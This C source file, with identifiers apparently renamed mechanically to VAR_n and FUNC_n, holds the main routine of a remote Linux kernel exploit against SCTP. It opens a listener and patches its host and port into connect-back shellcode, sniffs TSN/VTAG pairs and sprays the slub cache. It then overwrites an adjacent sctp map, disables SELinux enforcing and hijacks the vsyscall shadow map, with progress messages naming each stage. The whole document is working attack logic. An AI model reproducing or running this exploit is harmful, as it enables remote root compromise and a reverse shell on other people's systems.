
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_10__ TYPE_5__ ;
typedef struct TYPE_9__ TYPE_4__ ;
typedef struct TYPE_8__ TYPE_3__ ;
typedef struct TYPE_7__ TYPE_2__ ;
typedef struct TYPE_6__ TYPE_1__ ;


struct TYPE_6__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int o ;
typedef int l ;
typedef int __u32 ;
typedef int __u16 ;
struct TYPE_10__ {int nconn; int rport; int rhost; int lport; int lhost; } ;
struct TYPE_9__ {scalar_t__ allocator_type; int slubsize; int chunksize; int ptrsize; int scodesize; int vsysjumpsize; scalar_t__ vsysjump; scalar_t__ scode; scalar_t__ vsysaddr; scalar_t__ selinux; scalar_t__ hostoff; scalar_t__ portoff; } ;
struct TYPE_7__ {void* s_addr; } ;
struct TYPE_8__ {TYPE_2__ sin_addr; void* sin_port; void* sin_family; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 void* VAR_3 ;
 int VAR_4 ;
 scalar_t__ VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 scalar_t__ VAR_10 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (char*) ;
 int FUNC_2 (char*) ;
 int FUNC_3 (char*,scalar_t__,scalar_t__,scalar_t__,scalar_t__) ;
 scalar_t__ VAR_11 ;
 scalar_t__ FUNC_4 (int,struct sockaddr*,int) ;
 int FUNC_5 (scalar_t__,int,int) ;
 int FUNC_6 (int ,scalar_t__,int,int *) ;
 scalar_t__ VAR_12 ;
 int VAR_13 ;
 int FUNC_7 () ;
 TYPE_5__ VAR_14 ;
 void* FUNC_8 (int ) ;
 int FUNC_9 (int ,int) ;
 void* FUNC_10 (int ) ;
 TYPE_4__* VAR_15 ;
 scalar_t__ FUNC_11 (int,int) ;
 int FUNC_12 (int,int ,int) ;
 int FUNC_13 (scalar_t__,int*,int) ;
 int FUNC_14 (int) ;
 scalar_t__ VAR_16 ;
 int FUNC_15 (int,char**) ;
 int FUNC_16 (int,int ,int ,int,scalar_t__,scalar_t__) ;
 TYPE_3__ VAR_17 ;
 scalar_t__ FUNC_17 (int,int ,int ,char*,int) ;
 int FUNC_18 (int) ;
 void* FUNC_19 (void*,int ,int ) ;
 int VAR_18 ;
 int VAR_19 ;
 int VAR_20 ;
 int FUNC_20 () ;
 scalar_t__ VAR_21 ;
 scalar_t__ VAR_22 ;
 scalar_t__ VAR_23 ;
 scalar_t__ VAR_24 ;
 int FUNC_21 (int *) ;

int FUNC_22(int VAR_25, char **VAR_26)
{

  int VAR_27, VAR_28, VAR_29, VAR_30,VAR_31=1;
  struct sockaddr_in VAR_32;
  __u32 VAR_33;
  __u16 VAR_34;

  FUNC_15(VAR_25, VAR_26);

  VAR_30 = FUNC_19(VAR_3, VAR_7, VAR_2);
  if(FUNC_17(VAR_30, VAR_8, VAR_9, (char *)&VAR_31, sizeof(VAR_31)) < 0)
   FUNC_1("setsockopt: SO_REUSEADDR");

  VAR_32.sin_family = VAR_3;
  VAR_32.sin_port = FUNC_8(VAR_14.lport);
  VAR_32.sin_addr.s_addr = FUNC_10(VAR_14.lhost);
  if(FUNC_4(VAR_30, (struct sockaddr *)&VAR_32, sizeof(VAR_32)) < 0)
    FUNC_1("bind: sock");

  if(FUNC_11(VAR_30, 4) < 0)
    FUNC_1("listen: sock");



  VAR_33 = FUNC_10(VAR_14.lhost);
  VAR_34 = FUNC_8(VAR_14.lport);
  FUNC_13(VAR_15->scode + VAR_15->portoff, &VAR_34, 2);
  FUNC_13(VAR_15->scode + VAR_15->hostoff, &VAR_33, 4);

  VAR_16 = FUNC_19(VAR_3, VAR_6, VAR_1);
  if(VAR_16 < 0)
    FUNC_1("socket: RAW/SCTP montitor socket");

  VAR_17.sin_family = VAR_3;
  VAR_17.sin_port = FUNC_8(VAR_14.rport);
  VAR_17.sin_addr.s_addr = FUNC_10(VAR_14.rhost);

  FUNC_2("[**] Monitoring Network for TSN/VTAG pairs.. \n");
  VAR_27 = FUNC_6(VAR_13, VAR_12+VAR_10-8, VAR_0|VAR_4, ((void*)0));
  if(VAR_27 < 0)
    FUNC_1("clone");

  FUNC_18(1);

  FUNC_2("[**] Start flushing slub cache...\n");
  for(VAR_29=0; VAR_29<=VAR_14.nconn; VAR_29++)
  {
    __u16 VAR_35 = VAR_18-(VAR_14.nconn-1)+VAR_29;
    if(VAR_35 == VAR_18 || VAR_35== VAR_19)
      VAR_28 = FUNC_12(VAR_35, VAR_14.rport, 1);
    else
      VAR_28 = FUNC_12(VAR_18-(VAR_14.nconn-1)+VAR_29, VAR_14.rport, 0);

  }


  FUNC_7();

  FUNC_21(((void*)0));

  if(VAR_15->allocator_type == VAR_5)
    FUNC_20();

  if(VAR_23 && VAR_21 && VAR_24 && VAR_22)
  {
    __u32 VAR_36;

    FUNC_3("[**] Using TSN/VTAG pairs: (TSN: %x <=> VTAG: %x) / (TSN: %x <=> VTAG: %x)...\n", VAR_21, VAR_23, VAR_22, VAR_24);
    FUNC_18(1);

    if(VAR_15->selinux)
    {
      FUNC_2("[**] Overwriting neightboard sctp map..\n");
      VAR_36 = (VAR_15->slubsize - VAR_15->chunksize) / 2;
      VAR_27 = FUNC_5(VAR_15->selinux, VAR_15->ptrsize, VAR_36);
      if(VAR_27 < 0)
        FUNC_0("Error Building Streams...");

      FUNC_9(VAR_20, VAR_27);
      FUNC_16(VAR_18, VAR_14.rport, VAR_20, VAR_27, VAR_23, VAR_21);

      FUNC_2("[**] Disabling Selinux Enforcing Mode..\n");
      VAR_27 = FUNC_5(VAR_11, 4, 0);
      if(VAR_27 < 0)
        FUNC_0("Error Building Streams...");

      FUNC_9(VAR_20, VAR_27);
      FUNC_16(VAR_19, VAR_14.rport, VAR_20, VAR_27, VAR_24, VAR_22);
    }

    FUNC_2("[**] Overwriting neightboard sctp map ......\n");
    VAR_36 = (VAR_15->slubsize - VAR_15->chunksize) / 2;
    VAR_27 = FUNC_5(VAR_15->vsysaddr, VAR_15->ptrsize, VAR_36);
    if(VAR_27 < 0)
      FUNC_0("Error Building Streams...");

    FUNC_9(VAR_20, VAR_27);
    FUNC_16(VAR_18, VAR_14.rport, VAR_20, VAR_27, VAR_23, VAR_21);

    FUNC_2("[**] Overwriting vsyscall shadow map..\n");
    VAR_36 = 0x930 / 2;
    VAR_27 = FUNC_5(VAR_15->scode, VAR_15->scodesize, VAR_36);
    if(VAR_27 < 0)
      FUNC_0("Error Building Streams...");

    FUNC_9(VAR_20, VAR_27);
    FUNC_16(VAR_19, VAR_14.rport, VAR_20, VAR_27, VAR_24, VAR_22);

    FUNC_2("[**] Hijacking vsyscall shadow map..\n");
    VAR_27 = FUNC_5(VAR_15->vsysjump, VAR_15->vsysjumpsize, 0);
    if(VAR_27 < 0)
      FUNC_0("Error Building Streams...");

    FUNC_9(VAR_20, VAR_27);
    FUNC_16(VAR_19, VAR_14.rport, VAR_20, VAR_27, VAR_24, VAR_22);

    FUNC_18(1);
  }
  else
    FUNC_0("VTAG/TSN not found: network error");


  FUNC_14(VAR_30);
  FUNC_2("[**] Closing Connection... \n");
  return 0;
}
